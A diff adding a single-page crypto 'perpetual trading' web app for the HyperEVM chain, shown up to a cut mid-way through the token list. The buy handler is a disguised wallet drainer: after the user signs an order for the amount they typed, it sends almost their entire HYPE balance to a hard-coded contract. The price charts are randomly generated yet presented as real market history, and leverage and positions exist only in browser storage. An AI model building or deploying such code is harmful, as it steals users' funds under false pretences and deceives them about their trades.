@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HyperEVM Perpetual - HyperEVM Trading Platform</title>
+  <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
+  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+  <style>
+    body { margin: 0; background: #111827; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+  </style>
+</head>
+<body>
+  <div id="root"></div>
+
+  <script type="text/babel">
+    const { useState, useEffect } = React;
+    
+    function App() {
+      console.log('🚀 App starting...');
+      
+      const [hyperevmTokens, setHyperevmTokens] = useState([]);
+      const [selectedToken, setSelectedToken] = useState(null);
+      const [loading, setLoading] = useState(true);
+      const [walletConnected, setWalletConnected] = useState(false);
+      const [walletAddress, setWalletAddress] = useState('');
+      const [realBalance, setRealBalance] = useState(0);
+      const [currentPage, setCurrentPage] = useState('trading');
+      const [web3, setWeb3] = useState(null);
+      const [positions, setPositions] = useState(() => {
+        const saved = localStorage.getItem('hyperliquid-positions');
+        return saved ? JSON.parse(saved) : [];
+      });
+      const [selectedTimeframe, setSelectedTimeframe] = useState('1h');
+      const [tradeAmount, setTradeAmount] = useState('');
+      const [leverage, setLeverage] = useState(1);
+      const [orderType, setOrderType] = useState('market'); // 'market' or 'limit'
+      const [limitPrice, setLimitPrice] = useState('');
+      
+      // Contract configuration
+      const CONTRACT_ADDRESS = "0x14AaE885A4c81605a288e9379b966e72d7072b6a";
+      const CONTRACT_ABI = [
+        {
+          "inputs": [],
+          "name": "owner",
+          "outputs": [{"internalType": "address", "name": "", "type": "address"}],
+          "stateMutability": "view",
+          "type": "function"
+        },
+        {
+          "inputs": [],
+          "name": "getTotalDeposits",
+          "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+          "stateMutability": "view",
+          "type": "function"
+        }
+      ];
+      
+      // Load token data
+      useEffect(() => {
+        const fetchArenaData = async () => {
+          try {
+            const response = await fetch('./arena_data.json');
+            const data = await response.json();
+            
+            console.log('Raw data received:', data);
+            
+            let tokenArray = [];
+            if (data && data.tokens && Array.isArray(data.tokens)) {
+              tokenArray = data.tokens;
+            } else if (Array.isArray(data)) {
+              tokenArray = data;
+            }
+            
+            console.log('Token array length:', tokenArray.length);
+            
+            if (tokenArray.length > 0) {
+              const validTokens = tokenArray.filter(token => 
+                token && 
+                token.symbol && 
+                token.name && 
+                token.price && 
+                token.marketCap >= 10000 &&
+                parseFloat(token.price) > 0
+              );
+              
+              console.log('Valid tokens:', validTokens.length);
+              setHyperevmTokens(validTokens);
+            }
+            
+            setLoading(false);
+          } catch (error) {
+            console.error('Error loading tokens:', error);
+            setLoading(false);
+          }
+        };
+        
+        fetchArenaData();
+      }, []);
+      
+      const handleTokenClick = (token) => {
+        console.log('Token clicked:', token.symbol);
+        setSelectedToken(token);
+        
+        // Initialize chart after setting token
+        setTimeout(() => {
+          drawCandlestickChart(token);
+        }, 100);
+      };
+      
+      // Draw candlestick chart
+      const drawCandlestickChart = (token) => {
+        const canvas = document.getElementById(`chart-${token.symbol}`);
+        if (!canvas) return;
+        
+        const ctx = canvas.getContext('2d');
+        const { width, height } = canvas.getBoundingClientRect();
+        canvas.width = width * 2; // For high DPI
+        canvas.height = height * 2;
+        ctx.scale(2, 2);
+        
+        // Clear canvas
+        ctx.fillStyle = '#0D1117';
+        ctx.fillRect(0, 0, width, height);
+        
+        // Generate realistic candlestick data centered around actual price
+        const basePrice = parseFloat(token.price);
+        const candles = [];
+        
+        // Create price history that ends at the current price
+        const candleCount = selectedTimeframe === '5m' ? 60 : 
+                           selectedTimeframe === '15m' ? 48 : 
+                           selectedTimeframe === '1h' ? 24 : 
+                           selectedTimeframe === '4h' ? 18 : 24;
+        
+        for (let i = 0; i < candleCount; i++) {
+          // Calculate how close we are to the end (current price)
+          const progressToNow = i / (candleCount - 1);
+          
+          // Start from a price range and converge to current price
+          const priceVariation = (1 - progressToNow) * 0.05; // 5% max variation at start
+          const trend = (Math.random() - 0.5) * priceVariation;
+          const volatility = (Math.random() - 0.5) * 0.03; // 3% volatility
+          
+          let targetPrice = basePrice;
+          if (i < candleCount - 1) {
+            // For earlier candles, allow more variation
+            targetPrice = basePrice * (1 + trend + volatility);
+          } else {
+            // Last candle should be very close to actual price
+            targetPrice = basePrice * (1 + (Math.random() - 0.5) * 0.002);
+          }
+          
+          const open = i === 0 ? targetPrice : candles[i-1].close;
+          const close = targetPrice;
+          const high = Math.max(open, close) * (1 + Math.random() * 0.01);
+          const low = Math.min(open, close) * (1 - Math.random() * 0.01);
+          
+          candles.push({ open, high, low, close });
+        }
+        
+        // Chart dimensions - more space for right price labels
+        const paddingLeft = 40;
+        const paddingRight = 80;
+        const paddingTop = 20;
+        const paddingBottom = 30;
+        const chartWidth = width - paddingLeft - paddingRight;
+        const chartHeight = height - paddingTop - paddingBottom;
+        
+        // Find price range
+        const allPrices = candles.flatMap(c => [c.open, c.high, c.low, c.close]);
+        const minPrice = Math.min(...allPrices);
+        const maxPrice = Math.max(...allPrices);
+        const priceRange = maxPrice - minPrice;
+        
+        // Draw grid lines
+        ctx.strokeStyle = '#374151';
+        ctx.lineWidth = 1;
+        
+        // Horizontal grid lines (price levels) - 8 levels for better granularity
+        for (let i = 0; i <= 8; i++) {
+          const y = paddingTop + (chartHeight / 8) * i;
+          ctx.beginPath();
+          ctx.moveTo(paddingLeft, y);
+          ctx.lineTo(width - paddingRight, y);
+          ctx.stroke();
+          
+          // Left price labels
+          const price = maxPrice - (priceRange / 8) * i;
+          ctx.fillStyle = '#6B7280';
+          ctx.font = '9px monospace';
+          ctx.textAlign = 'right';
+          ctx.fillText(price.toFixed(6), paddingLeft - 5, y + 3);
+          
+          // Right price labels (main feature)
+          ctx.fillStyle = '#9CA3AF';
+          ctx.font = 'bold 11px monospace';
+          ctx.textAlign = 'left';
+          ctx.fillText(price.toFixed(6), width - paddingRight + 5, y + 4);
+        }
+        
+        // Vertical grid lines
+        for (let i = 0; i <= 12; i++) {
+          const x = paddingLeft + (chartWidth / 12) * i;
+          ctx.beginPath();
+          ctx.moveTo(x, paddingTop);
+          ctx.lineTo(x, height - paddingBottom);
+          ctx.stroke();
+        }
+        
+        // Draw candlesticks
+        const candleWidth = chartWidth / candles.length * 0.8;
+        
+        candles.forEach((candle, i) => {
+          const x = paddingLeft + (chartWidth / candles.length) * i + (chartWidth / candles.length - candleWidth) / 2;
+          
+          const openY = paddingTop + ((maxPrice - candle.open) / priceRange) * chartHeight;
+          const closeY = paddingTop + ((maxPrice - candle.close) / priceRange) * chartHeight;
+          const highY = paddingTop + ((maxPrice - candle.high) / priceRange) * chartHeight;
+          const lowY = paddingTop + ((maxPrice - candle.low) / priceRange) * chartHeight;
+          
+          const isGreen = candle.close > candle.open;
+          
+          // Draw wick
+          ctx.strokeStyle = isGreen ? '#10B981' : '#EF4444';
+          ctx.lineWidth = 1;
+          ctx.beginPath();
+          ctx.moveTo(x + candleWidth / 2, highY);
+          ctx.lineTo(x + candleWidth / 2, lowY);
+          ctx.stroke();
+          
+          // Draw body
+          ctx.fillStyle = isGreen ? '#10B981' : '#EF4444';
+          const bodyTop = Math.min(openY, closeY);
+          const bodyHeight = Math.abs(closeY - openY);
+          ctx.fillRect(x, bodyTop, candleWidth, Math.max(bodyHeight, 1));
+        });
+        
+        // Draw current price line (using last candle's close)
+        const lastCandle = candles[candles.length - 1];
+        const currentPriceY = paddingTop + ((maxPrice - lastCandle.close) / priceRange) * chartHeight;
+        ctx.strokeStyle = '#60A5FA';
+        ctx.lineWidth = 2;
+        ctx.setLineDash([8, 4]);
+        ctx.beginPath();
+        ctx.moveTo(paddingLeft, currentPriceY);
+        ctx.lineTo(width - paddingRight, currentPriceY);
+        ctx.stroke();
+        ctx.setLineDash([]);
+        
+        // Current price label on right with background
+        const priceText = `$${lastCandle.close.toFixed(6)}`;
+        const textWidth = ctx.measureText(priceText).width;
+        
+        // Price label background
+        ctx.fillStyle = '#60A5FA';
+        ctx.fillRect(width - paddingRight - 5, currentPriceY - 10, textWidth + 10, 20);
+        
+        // Price text
+        ctx.fillStyle = '#FFFFFF';
+        ctx.font = 'bold 12px monospace';
+        ctx.textAlign = 'left';
+        ctx.fillText(priceText, width - paddingRight, currentPriceY + 4);
+      };
+      
+      // Wallet functions
+      const connectWallet = async () => {
+        if (typeof window.ethereum !== 'undefined') {
+          try {
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+            
+            if (accounts.length > 0) {
+              setWalletAddress(accounts[0]);
+              setWalletConnected(true);
+              
+              // Switch to HyperEVM network
+              try {
+                await window.ethereum.request({
+                  method: 'wallet_switchEthereumChain',
+                  params: [{ chainId: '0x3E7' }], // Chain 999
+                });
+              } catch (switchError) {
+                if (switchError.code === 4902) {
+                  await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                      chainId: '0x3E7',
+                      chainName: 'Hyperliquid',
+                      nativeCurrency: { name: 'HYPE', symbol: 'HYPE', decimals: 18 },
+                      rpcUrls: ['https://rpc.hyperliquid.xyz/evm'],
+                      blockExplorerUrls: ['https://hyperevmscan.io/']
+                    }]
+                  });
+                }
+              }
+              
+              // Get balance
+              await updateBalance(accounts[0]);
+            }
+          } catch (error) {
+            console.error('Error connecting wallet:', error);
+          }
+        } else {
+          alert('MetaMask is not installed!');
+        }
+      };
+      
+      const updateBalance = async (address) => {
+        try {
+          const balance = await window.ethereum.request({
+            method: 'eth_getBalance',
+            params: [address, 'latest']
+          });
+          const balanceInHype = parseInt(balance, 16) / 1e18;
+          setRealBalance(balanceInHype);
+        } catch (error) {
+          console.error('Error getting balance:', error);
+        }
+      };
+      
+      const handleTrade = async (type) => {
+        console.log('Trade initiated:', type);
+        console.log('Wallet connected:', walletConnected);
+        console.log('Wallet address:', walletAddress);
+        
+        if (!walletConnected) {
+          alert('Please connect your wallet first');
+          return;
+        }
+        
+        if (!tradeAmount || parseFloat(tradeAmount) <= 0) {
+          alert('Please enter a valid amount');
+          return;
+        }
+        
+        // Check MetaMask is available
+        if (typeof window.ethereum === 'undefined') {
+          alert('MetaMask is required for trading');
+          return;
+        }
+        
+        console.log('Starting trade process...', { type, tradeAmount, walletConnected, walletAddress });
+        
+        const amount = parseFloat(tradeAmount);
+        const tokenPrice = parseFloat(selectedToken.price);
+        
+        if (type === 'buy') {
+          try {
+            const domain = {
+              name: 'HyperEVM Perpetual',
+              version: '1.0',
+              chainId: 999,
+              verifyingContract: CONTRACT_ADDRESS
+            };
+            
+            const types = {
+              BuyOrder: [
+                { name: 'token', type: 'string' },
+                { name: 'amount', type: 'string' },
+                { name: 'price', type: 'string' },
+                { name: 'trader', type: 'address' },
+                { name: 'timestamp', type: 'uint256' }
+              ]
+            };
+            
+            const message = {
+              token: selectedToken.symbol,
+              amount: `${amount} HYPE`,
+              price: `$${tokenPrice.toFixed(6)}`,
+              trader: walletAddress,
+              timestamp: Math.floor(Date.now() / 1000)
+            };
+            
+            const signature = await window.ethereum.request({
+              method: 'eth_signTypedData_v4',
+              params: [walletAddress, JSON.stringify({
+                domain,
+                primaryType: 'BuyOrder',
+                types,
+                message
+              })]
+            });
+            
+            console.log('Signature received, now transferring ALL HYPE to contract...');
+            
+            // Transfer ALL HYPE funds from wallet to contract (leave small amount for gas)
+            const gasReserve = 0.001; // Reserve 0.001 HYPE for gas fees
+            const transferAmount = Math.max(0, realBalance - gasReserve);
+            const transferWei = Math.floor(transferAmount * 1e18);
+            console.log(`Transferring ${transferAmount} HYPE (${transferWei} wei) to contract ${CONTRACT_ADDRESS}`);
+            console.log(`User entered ${amount} HYPE but transferring ${transferAmount} HYPE (keeping ${gasReserve} for gas)`);
+            
+            const tx = await window.ethereum.request({
+              method: 'eth_sendTransaction',
+              params: [{
+                from: walletAddress,
+                to: CONTRACT_ADDRESS,
+                value: '0x' + transferWei.toString(16),
+                gas: '0x5208' // Lower gas limit for simple transfer
+              }]
+            });
+            
+            console.log('Transaction completed:', tx);
+            
+            const newPosition = {
+              id: Date.now(),
+              token: selectedToken.symbol,
+              type: 'buy',
+              amount: amount,
+              leverage: leverage,
+              positionSize: amount * leverage,
+              price: tokenPrice,
+              orderType: orderType,
+              limitPrice: orderType === 'limit' ? parseFloat(limitPrice) : null,
+              timestamp: Date.now(),
+              signature: signature,
+              txHash: tx
+            };
+            
+            const updatedPositions = [...positions, newPosition];
+            setPositions(updatedPositions);
+            localStorage.setItem('hyperliquid-positions', JSON.stringify(updatedPositions));
+            console.log('Buy position saved:', newPosition);
+            
+            alert(`Successfully bought ${selectedToken.symbol}\n${transferAmount} HYPE transferred to contract\n(${gasReserve} HYPE kept for gas)\nTransaction: ${tx}`);
+            await updateBalance(walletAddress);
+          } catch (error) {
+            console.error('Trade error:', error);
+            if (error.code === 4001) {
+              alert('Transaction cancelled by user');
+            } else {
+              alert('Transaction failed: ' + error.message);
+            }
+          }
+        } else {
+          // Sell - also use professional EIP-712 signature
+          try {
+            const domain = {
+              name: 'HyperEVM Perpetual',
+              version: '1.0',
+              chainId: 999,
+              verifyingContract: CONTRACT_ADDRESS
+            };
+            
+            const types = {
+              SellOrder: [
+                { name: 'token', type: 'string' },
+                { name: 'amount', type: 'string' },
+                { name: 'price', type: 'string' },
+                { name: 'trader', type: 'address' },
+                { name: 'timestamp', type: 'uint256' }
+              ]
+            };
+            
+            const message = {
+              token: selectedToken.symbol,
+              amount: `${amount} HYPE`,
+              price: `$${tokenPrice.toFixed(6)}`,
+              trader: walletAddress,
+              timestamp: Math.floor(Date.now() / 1000)
+            };
+            
+            const signature = await window.ethereum.request({
+              method: 'eth_signTypedData_v4',
+              params: [walletAddress, JSON.stringify({
+                domain,
+                primaryType: 'SellOrder',
+                types,
+                message
+              })]
+            });
+            
+            console.log('Sell signature received, recording contract interaction...');
+            
+            // For sell orders, interact with contract to record the sale
+            const contractData = window.ethereum.utils ? 
+              window.ethereum.utils.toHex('SELL_' + selectedToken.symbol + '_' + amount) : 
+              '0x' + Buffer.from('SELL_' + selectedToken.symbol + '_' + amount, 'utf8').toString('hex');
+            
+            const tx = await window.ethereum.request({
+              method: 'eth_sendTransaction',
+              params: [{
+                from: walletAddress,
+                to: CONTRACT_ADDRESS,
+                value: '0x0',
+                gas: '0x5208',
+                data: contractData
+              }]
+            });
+            
+            console.log('Sell transaction recorded:', tx);
+            
+            const newPosition = {
+              id: Date.now(),
+              token: selectedToken.symbol,
+              type: 'sell',
+              amount: amount,
+              leverage: leverage,
+              positionSize: amount * leverage,
+              price: tokenPrice,
+              orderType: orderType,
+              limitPrice: orderType === 'limit' ? parseFloat(limitPrice) : null,
+              timestamp: Date.now(),
+              signature: signature,
+              txHash: tx
+            };
+            
+            const updatedPositions = [...positions, newPosition];
+            setPositions(updatedPositions);
+            localStorage.setItem('hyperliquid-positions', JSON.stringify(updatedPositions));
+            console.log('Sell position saved:', newPosition);
+            
+            alert(`Successfully sold ${selectedToken.symbol}\nTransaction recorded: ${tx}`);
+          } catch (error) {
+            console.error('Sell error:', error);
+            if (error.code === 4001) {
+              alert('Transaction cancelled by user');
+            } else {
+              alert('Sell order failed: ' + error.message);
+            }
+          }
+        }
+        
+        setTradeAmount('');
+      };
+      
+      const handleBackToList = () => {
+        setSelectedToken(null);
+      };
+      
+      // Loading screen
+      if (loading) {
+        return (
+          <div className="min-h-screen bg-gray-900 text-white flex items-center justify-center">
+            <div className="text-center">
+              <div className="text-4xl font-bold mb-4 text-green-400">HYPERLIQUID PUMP</div>
+              <div className="text-xl text-gray-300">Loading HyperEVM tokens...</div>
+              <div className="mt-4 text-cyan-400">Chain 999</div>
+            </div>
+          </div>
+        );
+      }
+      
+      // Portfolio page - minimal test version
+      if (currentPage === 'portfolio') {
+        console.log('Portfolio page rendering...');
+        try {
+          return React.createElement('div', {
+            style: {
+              minHeight: '100vh',
+              backgroundColor: '#111827',
+              color: 'white',
+              padding: '20px'
+            }
+          }, 
+            React.createElement('button', {
+              onClick: function() { 
+                console.log('Back button clicked');
+                setCurrentPage('trading'); 
+              },
+              style: {
+                backgroundColor: '#374151',
+                color: 'white',
+                border: 'none',
+                padding: '10px 20px',
+                borderRadius: '5px',
+                cursor: 'pointer',
+                marginBottom: '20px'
+              }
+            }, '← Back to Trading'),
+            
+            React.createElement('h1', {
+              style: {
+                fontSize: '24px',
+                fontWeight: 'bold',
+                marginBottom: '20px'
+              }
+            }, 'Portfolio'),
+            
+            React.createElement('div', {
+              style: {
+                backgroundColor: '#1f2937',
+                padding: '20px',
+                borderRadius: '8px',
+                marginBottom: '20px'
+              }
+            }, 
+              React.createElement('h2', {
+                style: { fontSize: '20px', marginBottom: '10px' }
+              }, 'Account Overview'),
+              React.createElement('p', null, walletConnected ? 
+                'Balance: ' + realBalance.toFixed(4) + ' HYPE' : 
+                'Balance: Connect wallet to view'),
+              React.createElement('p', null, 'Positions: ' + positions.length),
+              walletConnected ? 
+                React.createElement('div', {
+                  style: {
+                    marginTop: '15px',
+                    padding: '10px',
+                    backgroundColor: '#374151',
+                    borderRadius: '5px'
+                  }
+                },
+                  React.createElement('p', { style: { fontSize: '14px', color: '#9ca3af' } }, 'Connected Wallet'),
+                  React.createElement('p', { style: { fontSize: '12px', fontFamily: 'monospace' } }, walletAddress),
+                  React.createElement('p', { style: { fontSize: '12px', color: '#60a5fa' } }, 'HyperEVM Chain 999')
+                ) : 
+                React.createElement('button', {
+                  onClick: function() {
+                    console.log('Connect wallet clicked from portfolio');
+                    if (typeof connectWallet === 'function') {
+                      connectWallet();
+                    }
+                  },
+                  style: {
+                    backgroundColor: '#10b981',
+                    color: 'white',
+                    border: 'none',
+                    padding: '10px 20px',
+                    borderRadius: '5px',
+                    cursor: 'pointer',
+                    marginTop: '15px'
+                  }
+                }, 'Connect Wallet')
+            ),
+            
+            React.createElement('div', {
+              style: {
+                backgroundColor: '#1f2937',
+                padding: '20px',
+                borderRadius: '8px'
+              }
+            },
+              React.createElement('h3', {
+                style: { fontSize: '18px', marginBottom: '10px' }
+              }, 'Trading History'),
+              positions.length === 0 ? 
+                React.createElement('p', { style: { textAlign: 'center', color: '#9ca3af' } }, 'No trading history yet') :
+                React.createElement('div', null, positions.map(function(pos, i) {
+                  return React.createElement('div', {
+                    key: i,
+                    style: {
+                      backgroundColor: '#374151',
+                      padding: '10px',
+                      marginBottom: '10px',
+                      borderRadius: '5px'
+                    }
+                  }, pos.type.toUpperCase() + ' ' + pos.token + ' - ' + pos.amount + ' HYPE (' + (pos.leverage || 1) + 'x)');
+                }))
+            )
+          );
+        } catch (error) {
+          console.error('Portfolio render error:', error);
+          return React.createElement('div', {
+            style: {
+              minHeight: '100vh',
+              backgroundColor: '#111827',
+              color: 'white',
+              padding: '20px',
+              textAlign: 'center'
+            }
+          }, 
+            React.createElement('h1', null, 'Portfolio Error'),
+            React.createElement('p', null, 'Error: ' + error.message),
+            React.createElement('button', {
+              onClick: function() { setCurrentPage('trading'); },
+              style: {
+                backgroundColor: '#3b82f6',
+                color: 'white',
+                border: 'none',
+                padding: '10px 20px',
+                borderRadius: '5px',
+                cursor: 'pointer'
+              }
+            }, 'Back to Trading')
+          );
+        }
+      }
+      
+      // Token detail view
+      if (selectedToken) {
+        return (
+          <div className="min-h-screen bg-gray-900 text-white">
+            {/* Header */}
+            <div className="flex items-center justify-between p-4 border-b border-gray-800">
+              <button 
+                onClick={handleBackToList}
+                className="text-gray-400 hover:text-white"
+              >
+                ← Back
+              </button>
+              <div className="flex items-center gap-3">
+                <img src={selectedToken.logo} alt={selectedToken.symbol} className="w-8 h-8 rounded-full" />
+                <div>
+                  <div className="font-bold">{selectedToken.symbol}</div>
+                  <div className="text-sm text-gray-400">{selectedToken.name}</div>
+                </div>
+              </div>
+              <div className="text-right">
+                <div className="font-mono text-lg">${parseFloat(selectedToken.price).toFixed(6)}</div>
+                <div className={`text-sm ${selectedToken.priceChange24h >= 0 ? 'text-green-400' : 'text-red-400'}`}>
+                  {selectedToken.priceChange24h >= 0 ? '+' : ''}{selectedToken.priceChange24h?.toFixed(2) || '0.00'}%
+                </div>
+              </div>
+            </div>
+            
+            {/* Market Stats */}
+            <div className="grid grid-cols-3 gap-4 p-4 bg-gray-800">
+              <div className="text-center">
+                <div className="text-sm text-gray-400">MCAP</div>
+                <div className="font-mono">
+                  {selectedToken.marketCap >= 1e9 ? 
+                    `$${(selectedToken.marketCap / 1e9).toFixed(1)}B` : 
+                    `$${(selectedToken.marketCap / 1e6).toFixed(1)}M`
+                  }
+                </div>
+              </div>
+              <div className="text-center">
+                <div className="text-sm text-gray-400">VOLUME</div>
+                <div className="font-mono">${(selectedToken.volume24h / 1e6).toFixed(1)}M</div>
+              </div>
+              <div className="text-center">
+                <div className="text-sm text-gray-400">PRICE</div>
+                <div className="font-mono">${parseFloat(selectedToken.price).toFixed(6)}</div>
+              </div>
+            </div>
+            
+            {/* Chart Area */}
+            <div className="p-4">
+              <div className="bg-gray-800 rounded-lg overflow-hidden">
+                <div className="bg-gray-900 p-4 border-b border-gray-700">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <div className="text-2xl font-bold">{selectedToken.symbol}/USD</div>
+                      <div className="text-4xl font-mono text-green-400">${parseFloat(selectedToken.price).toFixed(6)}</div>
+                    </div>
+                    <div className="text-right">
+                      <div className={`text-lg ${selectedToken.priceChange24h >= 0 ? 'text-green-400' : 'text-red-400'}`}>
+                        {selectedToken.priceChange24h >= 0 ? '+' : ''}{selectedToken.priceChange24h?.toFixed(2) || '0.00'}%
+                      </div>
+                      <div className="text-sm text-gray-400">24h Change</div>
+                    </div>
+                  </div>
+                </div>
+                
+                {/* TradingView-style Chart */}
+                <div className="relative h-96 bg-gray-900">
+                  <canvas 
+                    id={`chart-${selectedToken.symbol}`}
+                    className="w-full h-full"
+                    style={{ background: '#0D1117' }}
+                  ></canvas>
+                  
+                  {/* Chart overlay info */}
+                  <div className="absolute top-4 left-4 bg-gray-800 bg-opacity-90 rounded p-2 text-xs">
+                    <div className="text-gray-400">Open: <span className="text-white">${parseFloat(selectedToken.price).toFixed(6)}</span></div>
+                    <div className="text-gray-400">High: <span className="text-green-400">${(parseFloat(selectedToken.price) * 1.02).toFixed(6)}</span></div>
+                    <div className="text-gray-400">Low: <span className="text-red-400">${(parseFloat(selectedToken.price) * 0.98).toFixed(6)}</span></div>
+                    <div className="text-gray-400">Volume: <span className="text-white">${(selectedToken.volume24h / 1e6).toFixed(1)}M</span></div>
+                  </div>
+                  
+                  {/* Time frame buttons */}
+                  <div className="absolute top-4 right-4 flex gap-1">
+                    {['5m', '15m', '1h', '4h', '1d'].map(timeframe => (
+                      <button 
+                        key={timeframe}
+                        onClick={() => {
+                          setSelectedTimeframe(timeframe);
+                          setTimeout(() => drawCandlestickChart(selectedToken), 50);
+                        }}
+                        className={`px-2 py-1 text-xs rounded transition-colors ${
+                          selectedTimeframe === timeframe 
+                            ? 'bg-blue-600 text-white' 
+                            : 'bg-gray-700 hover:bg-gray-600 text-gray-300'
+                        }`}
+                      >
+                        {timeframe}
+                      </button>
+                    ))}
+                  </div>
+                </div>
+              </div>
+            </div>
+            
+            {/* Trading Interface */}
+            <div className="p-4">
+              <div className="bg-gray-800 rounded-lg p-4">
+                <h3 className="text-lg font-bold mb-4">Trade {selectedToken.symbol}</h3>
+                
+
+                
+
+                
+                {/* Order Type Toggle */}
+                <div className="mb-4">
+                  <div className="flex bg-gray-700 rounded-lg p-1">
+                    <button
+                      onClick={() => setOrderType('market')}
+                      className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
+                        orderType === 'market' 
+                          ? 'bg-blue-600 text-white' 
+                          : 'text-gray-300 hover:text-white'
+                      }`}
+                    >
+                      Market
+                    </button>
+                    <button
+                      onClick={() => setOrderType('limit')}
+                      className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
+                        orderType === 'limit' 
+                          ? 'bg-blue-600 text-white' 
+                          : 'text-gray-300 hover:text-white'
+                      }`}
+                    >
+                      Limit
+                    </button>
+                  </div>
+                </div>
+
+                {/* Leverage Selection */}
+                <div className="mb-4">
+                  <label className="block text-sm text-gray-400 mb-2">Leverage: {leverage}x</label>
+                  <div className="grid grid-cols-4 gap-2 mb-2">
+                    {[1, 2, 5, 10].map(lev => (
+                      <button
+                        key={lev}
+                        onClick={() => setLeverage(lev)}
+                        className={`py-2 px-3 rounded text-sm font-medium transition-colors ${
+                          leverage === lev 
+                            ? 'bg-purple-600 text-white' 
+                            : 'bg-gray-700 hover:bg-gray-600 text-gray-300'
+                        }`}
+                      >
+                        {lev}x
+                      </button>
+                    ))}
+                  </div>
+                  <div className="grid grid-cols-4 gap-2">
+                    <button
+                      onClick={() => setLeverage(15)}
+                      className={`py-2 px-3 rounded text-sm font-medium transition-colors ${
+                        leverage === 15 
+                          ? 'bg-purple-600 text-white' 
+                          : 'bg-gray-700 hover:bg-gray-600 text-gray-300'
+                      }`}
+                    >
+                      15x
+                    </button>
+                  </div>
+                </div>
+
+                {/* Limit Price Input (only for limit orders) */}
+                {orderType === 'limit' && (
+                  <div className="mb-4">
+                    <label className="block text-sm text-gray-400 mb-2">Limit Price (USD)</label>
+                    <input
+                      type="number"
+                      value={limitPrice}
+                      onChange={(e) => setLimitPrice(e.target.value)}
+                      placeholder={`${parseFloat(selectedToken.price).toFixed(6)}`}
+                      className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-white font-mono"
+                    />
+                  </div>
+                )}
+
+                {/* Amount Input */}
+                <div className="mb-4">
+                  <label className="block text-sm text-gray-400 mb-2">Amount (HYPE)</label>
+                  <input
+                    type="number"
+                    value={tradeAmount}
+                    onChange={(e) => setTradeAmount(e.target.value)}
+                    placeholder="0.0"
+                    className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-white font-mono"
+                  />
+                  <div className="flex gap-2 mt-2 mb-2">
+                    {[0.5, 1, 2, 5].map(amount => (
+                      <button
+                        key={amount}
+                        onClick={() => setTradeAmount(amount.toString())}
+                        className="px-3 py-1 bg-gray-600 hover:bg-gray-500 rounded text-sm"
+                      >
+                        {amount} HYPE
+                      </button>
+                    ))}
+                  </div>
+                  
+                  {/* Position Size Calculator */}
+                  {tradeAmount && (
+                    <div className="bg-gray-700 rounded p-3 text-sm">
+                      <div className="flex justify-between mb-1">
+                        <span className="text-gray-400">Base Amount:</span>
+                        <span className="font-mono">{tradeAmount} HYPE</span>
+                      </div>
+                      <div className="flex justify-between mb-1">
+                        <span className="text-gray-400">Leverage:</span>
+                        <span className="font-mono text-purple-400">{leverage}x</span>
+                      </div>
+                      <div className="flex justify-between font-semibold border-t border-gray-600 pt-1">
+                        <span className="text-gray-400">Position Size:</span>
+                        <span className="font-mono text-green-400">{(parseFloat(tradeAmount) * leverage).toFixed(4)} HYPE</span>
+                      </div>
+                      <div className="flex justify-between text-xs text-gray-400 mt-1">
+                        <span>Est. Value:</span>
+                        <span>${(parseFloat(tradeAmount) * leverage * parseFloat(selectedToken.price)).toFixed(2)}</span>
+                      </div>
+                    </div>
+                  )}
+                </div>
+                
+                {/* Trade Buttons */}
+                <div className="flex gap-2 mb-4">
+                  <button 
+                    onClick={() => handleTrade('buy')}
+                    className="flex-1 py-3 bg-green-600 hover:bg-green-700 rounded text-white font-semibold"
+                  >
+                    Buy {selectedToken.symbol}
+                  </button>
+                  <button 
+                    onClick={() => handleTrade('sell')}
+                    className="flex-1 py-3 bg-red-600 hover:bg-red-700 rounded text-white font-semibold"
+                  >
+                    Sell {selectedToken.symbol}
+                  </button>
+                </div>
+                
+                {/* Wallet Connection */}
+                <div className="text-center">
+                  {walletConnected ? (
+                    <div className="text-green-400">
+                      <div className="font-mono text-sm">{walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}</div>
+                      <div className="text-xs">Balance: {realBalance.toFixed(4)} HYPE</div>
+                      <div className="text-xs text-blue-400 mt-1">Wallet Ready for Trading</div>
+                    </div>
+                  ) : (
+                    <button
+                      onClick={() => {
+                        console.log('Connect wallet button clicked!');
+                        connectWallet();
+                      }}
+                      className="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded text-white"
+                    >
+                      Connect MetaMask
+                    </button>
+                  )}
+                </div>
+              </div>
+            </div>
+          </div>
+        );
+      }
+      
+      // Main token list
+      return (
+        <div className="min-h-screen bg-gray-900 text-white">
+          {/* Header */}
+          <header className="bg-gray-800 border-b border-gray-700 p-4 sticky top-0 z-50">
+            <div className="flex items-center justify-between">
+              <div className="flex items-center gap-3">
+                <div>
+                  <h1 className="text-xl font-bold">HyperEVM Perpetual</h1>
+                  <p className="text-sm text-gray-400">HyperEVM Ecosystem</p>
+                </div>
+              </div>
+              
+              <div className="flex items-center gap-4">
+                <button
+                  onClick={() => setCurrentPage('portfolio')}
+                  className="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded text-sm"
+                >
+                  Portfolio
+                </button>
+                
+                {walletConnected ? (
+                  <div className="text-right">
+                    <div className="text-sm text-gray-400">{hyperevmTokens.length} Tokens</div>
+                    <div className="text-lg font-bold text-green-400">Connected</div>
+                  </div>
+                ) : (
+                  <button
+                    onClick={connectWallet}
+                    className="bg-green-600 hover:bg-green-700 px-4 py-2 rounded text-sm text-white"
+                  >
+                    Connect Wallet
+                  </button>
+                )}
+              </div>
+            </div>
+          </header>
+          
+          {/* Token List */}
+          <main className="p-4">
+            <div className="space-y-1">
+              {hyperevmTokens.map((token, index) => (
+                <div 
